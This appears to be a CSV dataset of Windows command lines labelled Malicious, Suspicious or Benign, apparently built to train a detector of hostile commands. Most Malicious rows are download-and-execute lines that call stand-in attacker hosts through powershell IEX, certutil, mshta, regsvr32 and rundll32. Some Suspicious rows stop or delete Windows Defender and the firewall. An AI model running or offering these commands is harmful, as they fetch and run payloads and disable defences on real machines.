Prompt,Label,Type
"rundll32 setupapi.dll,InstallHinfSection DefaultInstall 132 install.inf",Malicious,command
"rundll32.exe ieadvpack.dll,LaunchINFSection evil.inf",Malicious,command
powershell Invoke-WebRequest -Uri http://mal.site/backdoor.ps1 -OutFile C:\Users\Public\b.ps1,Malicious,command
xwizard RunWizard {00000001-0000-0000-0000-0000FEEDC0DE} /zhttp://evil/payload,Malicious,command
DataSvcUtil /out:C:\calc.exe /uri:http://attacker/command,Malicious,command
installutil.exe /U shell.dll,Malicious,command
"rundll32 shell32.dll,ShellExec_RunDLL http://10.10.10.10/start",Malicious,command
configsecuritypolicy.exe C:\calc.exe https://mal.site/api,Malicious,command
powershell IEX (New-Object Net.WebClient).DownloadString('http://evil.ps1'),Malicious,command
regsvcs.exe c:\temp\infect.dll,Malicious,command
extrac32.exe /C /Y \\attacker\payload.cab C:\extract\mal.exe,Malicious,command
replace.exe \\net\evil.exe C:\target /A,Malicious,command
"rundll32.exe Mshtml.dll,RunHTMLApplication http://bad.ip/payload.hta",Malicious,command
"rundll32.exe zipfldr.dll,RouteTheCall \\evil\payload.dll",Malicious,command
cmd /c echo regsvr32 /u /i:http://evil.com/f.sct scrobj.dll > out.bat,Malicious,command
"powershell -ep bypass -file ""C:\attack\loader.ps1""",Malicious,command
AppVLP.exe \\evilhost\runme.bat,Malicious,command
certreq -Post -config https://malicious.site cfg.ini,Malicious,command
makecab payload.exe malicious.cab,Malicious,command
"rundll32 advpack.dll,LaunchINFSection payload.inf",Malicious,command
"SyncAppvPublishingServer.vbs ""(New-Object Net.WebClient).DownloadString('http://...')""",Malicious,command
"rundll32.exe setupapi.dll,InstallHinfSection DefaultInstall 132 evil.inf",Malicious,command
dotnet.exe C:\hacks\loader.dll,Malicious,command
wscript.exe C:\Users\Public\malware.vbs,Malicious,command
"rundll32.exe Mshtml.dll,RunHTMLApplication http://192.168.1.15/script.hta",Malicious,command
MpCmdRun.exe -DownloadFile -url https://remote.site/file.exe -path C:\drop\shell.exe,Malicious,command
"rundll32 shdocvw.dll,OpenURL \remote\evil.url",Malicious,command
"powershell -w hidden -c ""IEX(iwr('http://command'))""",Malicious,command
configsecuritypolicy.exe payload.exe http://command-and-control/ping,Malicious,command
reg import suspicious.reg,Suspicious,command
taskkill /f /im explorer.exe,Suspicious,command
pcalua.exe -a calc.exe,Suspicious,command
"explorer.exe /select,C:\Windows\Tasks\task.bat",Suspicious,command
"forfiles /p c:\ /m *.exe /c ""cmd /c attrib -s -h @file""",Suspicious,command
cmd /c start \\network\malware.exe,Suspicious,command
print /D:C:\file.dll:evil.exe C:\file.dll,Suspicious,command
cmstp.exe /ni /s c:\malicious.inf,Suspicious,command
"bitsadmin /SetNotifyCmdLine 1 ""cmd.exe"" NULL",Suspicious,command
ftp -s:upload.txt,Suspicious,command
rasautou -d back.dll -p shell -a a -e e,Suspicious,command
reg load HKLM\BAD hive.dat,Suspicious,command
"rundll32.exe shell32.dll,Control_RunDLL payload.dll",Suspicious,command
sc stop wuauserv,Suspicious,command
powershell Start-Process evil.ps1,Suspicious,command
net use Z: \\host\payload,Suspicious,command
powershell Get-Process,Benign,command
ipconfig /flushdns,Benign,command
net user,Benign,command
"tasklist /fi ""imagename eq svchost.exe""",Benign,command
ping www.google.com,Benign,command
systeminfo,Benign,command
hostname,Benign,command
whoami,Benign,command
"Where-Object {$_.Status -eq ""Running""}",Suspicious,command
powershell Get-Service,Benign,command
sc query windefend,Benign,command
explorer.exe,Benign,command
netstat -e,Benign,command
netsh interface show interface,Benign,command
fsutil fsinfo drives,Benign,command
chkdsk,Benign,command
shutdown /r /t 0,Benign,command
runas /user:Administrator notepad.exe,Benign,command
title ZHAAN Active Session,Benign,command
copy C:\log.txt D:\backup\log.txt,Benign,command
del C:\Temp\*.log /f /q,Benign,command
echo Ready for scan...,Benign,command
certutil -urlcache -split -f http://bad.site/dropper.exe dropper.exe,Malicious,command
"rundll32 url.dll,OpenURL http://192.168.1.12/malware",Malicious,command
"powershell -ep bypass -Command ""IEX(New-Object Net.WebClient).DownloadString('http://...')""",Malicious,command
"mshta vbscript:Execute(""GetObject(""script:https://host/file.sct\"")"")",Malicious,command
MpCmdRun.exe -DownloadFile -url http://evil.local/file.exe -path C:\temp\mal.exe,Malicious,command
msbuild.exe payload.xml,Malicious,command
"wmic process call create ""cmd.exe /c powershell -nop -enc SQB...""",Malicious,command
regsvr32 /i:http://malicious/payload.sct scrobj.dll,Malicious,command
"SyncAppvPublishingServer.vbs ""IEX((New-Object Net.WebClient).DownloadString('http://...'))""",Malicious,command
makecab \attacker\evil.exe C:\backup\bad.cab,Malicious,command
"rundll32 advpack.dll,LaunchINFSection evil.inf",Malicious,command
"rundll32 setupapi.dll,InstallHinfSection DefaultInstall 132 setup.inf",Malicious,command
"rundll32.exe ieadvpack.dll,LaunchINFSection run.inf",Malicious,command
powershell Invoke-WebRequest -Uri http://10.10.10.11/evil.ps1 -OutFile loader.ps1,Malicious,command
DataSvcUtil /out:C:\Windows\System32\evil.exe /uri:http://host/cmd,Malicious,command
configsecuritypolicy.exe calc.exe http://malicious.api/inject,Malicious,command
"rundll32.exe Mshtml.dll,RunHTMLApplication http://badserver/hta",Malicious,command
AppVLP.exe \webdav\script.bat,Malicious,command
certreq -Post -config https://malicious/policy.inf,Malicious,command
extrac32 /Y /C \remote\badcab.cab C:\temp\script.vbs,Malicious,command
"powershell -windowstyle hidden -c ""IEX(iwr('http://command'))""",Malicious,command
"rundll32 zipfldr.dll,RouteTheCall http://10.10.10.10/exploit.dll",Malicious,command
dotnet.exe malware.dll,Malicious,command
regsvcs.exe injection.dll,Malicious,command
"rundll32.exe shdocvw.dll,OpenURL http://remote/redirect",Malicious,command
"rundll32.exe advpack.dll,RegisterOCX mal.ocx",Malicious,command
"powershell -w hidden -ep bypass -Command ""IEX (iwr('http://suspicious.ps1'))""",Malicious,command
HH.exe http://192.168.1.50/run.ps1,Malicious,command
ilasm.exe /exe exploit.il,Malicious,command
"rundll32.exe Mshtml.dll,RunHTMLApplication http://evil/script.hta",Malicious,command
MpCmdRun.exe -DownloadFile -url http://mal.com/b.exe -path C:\Public\b.exe,Malicious,command
"rundll32 setupapi.dll,InstallHinfSection malicious.inf",Malicious,command
powershell IEX(New-Object Net.WebClient).DownloadString('http://attack.ps1'),Malicious,command
"rundll32 shell32.dll,ShellExec_RunDLL https://c2.site/start",Malicious,command
replace.exe \\host\inject.exe C:\temp /A,Malicious,command
"rundll32.exe setupapi.dll,InstallHinfSection DefaultInstall 132 loader.inf",Malicious,command
dotnet.exe payload.dll,Malicious,command
installutil.exe /U backdoor.dll,Malicious,command
mshta http://attacker/lure.hta,Malicious,command
sc delete windefend,Suspicious,command
reg load HKLM\OFFLINE hive.dat,Suspicious,command
net stop Windows Defender,Suspicious,command
taskkill /f /im svchost.exe,Suspicious,command
"rundll32.exe shell32.dll,Control_RunDLL update.dll",Suspicious,command
"explorer.exe /select,C:\Windows\Tasks\t.exe",Suspicious,command
rasautou -d lib.dll -p main -a a -e e,Suspicious,command
reg import config.reg,Suspicious,command
bitsadmin /SetNotifyCmdLine 1 calc.exe NULL,Suspicious,command
xwizard RunWizard {CLSID} /zhttps://attacker/lure,Suspicious,command
net use y: \malhost\drop,Suspicious,command
cmstp.exe /ni /s \temp\remote.inf,Suspicious,command
"forfiles /m *.dll /c ""cmd /c echo %1""",Suspicious,command
powershell Start-Process ./load.ps1,Suspicious,command
pcalua.exe -a C:\bad\evil.exe,Suspicious,command
net session,Suspicious,command
whoami,Benign,command
ipconfig /all,Benign,command
ping 8.8.8.8,Benign,command
hostname,Benign,command
netstat -an,Benign,command
systeminfo,Benign,command
shutdown /s /t 60,Benign,command
chkdsk /f,Benign,command
sc query wuauserv,Benign,command
net user,Benign,command
fsutil fsinfo drives,Benign,command
tree,Benign,command
echo ZHAAN is live,Benign,command
cls,Benign,command
tasklist,Benign,command
explorer.exe,Benign,command
title ZHAAN Terminal,Benign,command
net accounts,Benign,command
runas /user:admin cmd,Benign,command
type C:\readme.txt,Benign,command
del /f /q *.tmp,Benign,command
copy /y C:\a.txt D:\b.txt,Benign,command
"rundll32.exe ieadvpack.dll,RegisterOCX evil.ocx",Malicious,command
powershell IEX (iwr('http://malicious.ps1')),Malicious,command
"rundll32.exe Mshtml.dll,RunHTMLApplication http://bad.ip/script.hta",Malicious,command
mpCmdRun.exe -DownloadFile -url http://host/bad.exe -path C:\out\mal.exe,Malicious,command
"rundll32 setupapi.dll,InstallHinfSection default.inf",Malicious,command
"mshta.exe vbscript:Execute(""GetObject(""script:http://evil.site/f.sct\"")"")",Malicious,command
regsvcs.exe malicious.dll,Malicious,command
configsecuritypolicy.exe calc.exe http://callback.site/report,Malicious,command
certutil -urlcache -split -f http://bad.site/tool.exe tool.exe,Malicious,command
ilasm.exe /exe payload.il,Malicious,command
"rundll32 shdocvw.dll,OpenURL http://remotehost/file.html",Malicious,command
extrac32 /Y /C \evilhost\payload.cab C:\mal\payload.dll,Malicious,command
makecab \attacker\exec.exe C:\archive\packed.cab,Malicious,command
"rundll32 zipfldr.dll,RouteTheCall C:\loader.dll",Malicious,command
"SyncAppvPublishingServer.vbs ""(New-Object Net.WebClient).DownloadString('http://evil')""",Malicious,command
powershell -enc JAB...,Malicious,command
"rundll32.exe advpack.dll,LaunchINFSection malicious.inf",Malicious,command
certreq -Post -config https://remote/policy.ini,Malicious,command
AppVLP.exe \10.10.10.10\shell.bat,Malicious,command
"rundll32.exe Mshtml.dll,RunHTMLApplication javascript:alert('owned')",Malicious,command
cmd /c echo regsvr32 /s /n /u /i:http://evil.net/file.sct scrobj.dll > m.bat,Malicious,command
installutil.exe /U trojan.dll,Malicious,command
wscript.exe \network\script.vbs,Malicious,command
"rundll32.exe setupapi.dll,InstallHinfSection DefaultInstall 132 payload.inf",Malicious,command
dotnet.exe payload.dll,Malicious,command
makecab C:\loader.exe C:\cab\loader.cab,Malicious,command
MpCmdRun.exe -DownloadFile -url https://attack.net/b.exe -path C:\temp\drop.exe,Malicious,command
powershell IEX (New-Object Net.WebClient).DownloadString('http://inject.ps1'),Malicious,command
diantz.exe \remote\mal.exe C:\test\mal.cab,Malicious,command
replace.exe \share\evil.exe C:\data /A,Malicious,command
"rundll32 advpack.dll,RegisterOCX malware.ocx",Malicious,command
"rundll32.exe Mshtml.dll,RunHTMLApplication http://192.168.0.13/open.hta",Malicious,command
"rundll32 shell32.dll,ShellExec_RunDLL https://malicious.com/start",Malicious,command
"rundll32.exe advpack.dll,RegisterOCX C:\evil.ocx",Malicious,command
"rundll32 setupapi.dll,InstallHinfSection malware.inf",Malicious,command
"rundll32.exe zipfldr.dll,RouteTheCall \network\attack.dll",Malicious,command
certutil -decode input.b64 out.exe,Malicious,command
hh.exe http://malhost/shell.ps1,Malicious,command
powershell IEX((New-Object Net.WebClient).DownloadString('http://c2.server')),Malicious,command
"mshta vbscript:Execute(""GetObject(""script:https://malicious.domain/file.sct\"")"")",Malicious,command
sc stop windefend,Suspicious,command
net use z: \host\mapped,Suspicious,command
pcalua.exe -a notepad.exe,Suspicious,command
taskkill /f /im taskmgr.exe,Suspicious,command
reg import tweaks.reg,Suspicious,command
ftp -s:push.txt,Suspicious,command
cmstp.exe /ni /s remote.inf,Suspicious,command
print /D:C:\ADS\mal.exe:file.exe C:\ADS\mal.exe,Suspicious,command
"powershell -file ""install.ps1""",Suspicious,command
"explorer.exe /select,C:\Windows\Tasks\hidden.txt",Suspicious,command
bitsadmin /SetNotifyCmdLine 1 payload.exe NULL,Suspicious,command
"rundll32.exe shell32.dll,Control_RunDLL system.dll",Suspicious,command
rasautou -d run.dll -p agent -a a -e e,Suspicious,command
reg load HKLM\OFFLINE_SYSTEM hive.dat,Suspicious,command
"runas /user:admin ""C:\Windows\System32\cmd.exe""",Suspicious,command
net time \domaincontroller,Suspicious,command
hostname,Benign,command
whoami,Benign,command
ping 127.0.0.1,Benign,command
ipconfig,Benign,command
chkdsk,Benign,command
cls,Benign,command
netstat -ano,Benign,command
shutdown /l,Benign,command
echo System ready,Benign,command
net user,Benign,command
fsutil fsinfo drives,Benign,command
powershell Get-Help,Benign,command
explorer.exe,Benign,command
title Welcome to ZHAAN,Benign,command
tasklist /v,Benign,command
del /f /q *.bak,Benign,command
start notepad.exe,Benign,command
systeminfo,Benign,command
gpupdate /force,Benign,command
copy C:\report.txt D:\backup\report.txt,Benign,command
"rundll32.exe Mshtml.dll,RunHTMLApplication http://mal.site/launcher.hta",Malicious,command
MpCmdRun.exe -DownloadFile -url http://10.0.0.9/attack.exe -path C:\temp\attack.exe,Malicious,command
"rundll32 setupapi.dll,InstallHinfSection malware.inf",Malicious,command
"mshta vbscript:Execute(""GetObject(""script:http://bad/evil.sct\"")"")",Malicious,command
powershell -enc SQB...,Malicious,command
installutil.exe /U inject.dll,Malicious,command
regsvcs.exe backdoor.dll,Malicious,command
"rundll32 advpack.dll,RegisterOCX payload.ocx",Malicious,command
"rundll32.exe zipfldr.dll,RouteTheCall \attacker\load.dll",Malicious,command
"SyncAppvPublishingServer.vbs ""(New-Object Net.WebClient).DownloadString('http://remote'))""",Malicious,command
"rundll32.exe shdocvw.dll,OpenURL http://control/command",Malicious,command
configsecuritypolicy.exe loader.exe http://site/update,Malicious,command
DataSvcUtil /out:C:\Windows\System32\calc.exe /uri:http://api.attacker/payload,Malicious,command
msbuild.exe evil_build.xml,Malicious,command
"rundll32 shell32.dll,ShellExec_RunDLL https://c2.attacker/binary",Malicious,command
certutil -decode a.b64 a.exe,Malicious,command
AppVLP.exe \\attacker\mal.bat,Malicious,command
powershell IEX((New-Object Net.WebClient).DownloadString('http://malhost/script.ps1')),Malicious,command
wscript.exe \net\dropper.vbs,Malicious,command
diantz.exe \host\script.exe C:\dump\payload.cab,Malicious,command
"rundll32 advpack.dll,LaunchINFSection inject.inf",Malicious,command
extrac32 /Y /C \badhost\drop.cab C:\stage\inject.exe,Malicious,command
certreq -Post -config https://control.domain/config.ini,Malicious,command
dotnet.exe inject.dll,Malicious,command
replace.exe \network\file.exe C:\temp /A,Malicious,command
ilasm.exe /dll payload.il,Malicious,command
"mshta ""javascript:alert('compromised')""",Malicious,command
"rundll32.exe Mshtml.dll,RunHTMLApplication http://host/redirect.hta",Malicious,command
hh.exe http://example.com/exploit.ps1,Malicious,command
"rundll32.exe ieadvpack.dll,RegisterOCX \dropper\trojan.ocx",Malicious,command
"rundll32.exe setupapi.dll,InstallHinfSection DefaultInstall 132 inject.inf",Malicious,command
makecab loader.exe loader.cab,Malicious,command
MpCmdRun.exe -DownloadFile -url https://host.net/back.exe -path C:\infect\back.exe,Malicious,command
regsvr32 /s /n /u /i:http://malicious/f.sct scrobj.dll,Malicious,command
powershell -ep bypass -file runme.ps1,Malicious,command
"rundll32.exe advpack.dll,RegisterOCX attacker.ocx",Malicious,command
"rundll32 zipfldr.dll,RouteTheCall \remote\payload.dll",Malicious,command
makecab C:\Users\Public\tool.exe C:\Users\Public\tool.cab,Malicious,command
"SyncAppvPublishingServer.vbs ""IEX(New-Object Net.WebClient).DownloadString('http://evil')""",Malicious,command
"rundll32.exe Mshtml.dll,RunHTMLApplication javascript:window.alert(""ZHAAN"")",Malicious,command
reg import policies.reg,Suspicious,command
"explorer.exe /select,C:\Windows\Tasks\task.vbs",Suspicious,command
bitsadmin /SetNotifyCmdLine 1 C:\Windows\System32\cmd.exe NULL,Suspicious,command
"net stop ""Windows Update""",Suspicious,command
ftp -n -s:putfile.txt,Suspicious,command
pcalua.exe -a calc.exe,Suspicious,command
xwizard RunWizard {7940acf8-60ba-4213-a7c3-f3b400ee266d} /zhttp://host/inject,Suspicious,command
print /D:C:\file.txt:evil.exe file.txt,Suspicious,command
cmd /c start \remote\launch.bat,Suspicious,command
sc stop firewall,Suspicious,command
rasautou -d secure.dll -p stealth -a a -e e,Suspicious,command
powershell -w hidden -file download.ps1,Suspicious,command
cmstp.exe /ni /s infsetup.inf,Suspicious,command
"rundll32.exe shell32.dll,Control_RunDLL options.dll",Suspicious,command
"forfiles /p C:\ /m *.dll /c ""cmd /c attrib -s -h @file""",Suspicious,command
net use p: \server\payload,Suspicious,command
whoami,Benign,command
ipconfig /displaydns,Benign,command
ping 1.1.1.1,Benign,command
hostname,Benign,command
"echo ""ZHAAN activated""",Benign,command
